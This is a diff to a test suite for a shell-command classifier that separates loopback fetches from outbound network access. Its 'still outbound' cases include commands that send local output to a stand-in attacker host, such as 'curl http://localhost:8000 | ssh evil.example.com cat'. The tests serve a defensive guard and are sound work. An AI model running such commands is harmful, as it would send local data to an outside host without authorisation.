@@ -375,7 +375,6 @@ describe("loopback fetches are not outbound network", () => {
 	for (const command of [
 		"curl -s -o /dev/null -w '%{http_code}\\n' http://localhost:8000/my-garage/",
 		"curl http://127.0.0.1:8080/health",
-		"curl -s 'http://localhost:9222/json' | jq .",
 		"wget -qO- http://localhost:3000/",
 		"curl 127.0.0.1:8000/x",
 	]) {
@@ -390,6 +389,11 @@ describe("loopback fetches are not outbound network", () => {
 		"curl -o /tmp/x http://localhost:8000 http://evil.example.com",
 		// Non-fetch network verbs keep their verdicts, even to loopback.
 		"ssh localhost 'ls'",
+		// A downstream stage that can egress the loopback output keeps the
+		// command outbound: the loopback exemption is single-stage only.
+		// (A pipe into a recognized read-only consumer like `jq` was never
+		// loopback-rule territory; the read-fetch tables clear it.)
+		"curl http://localhost:8000 | ssh evil.example.com cat",
 	]) {
 		test(`still outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(true);
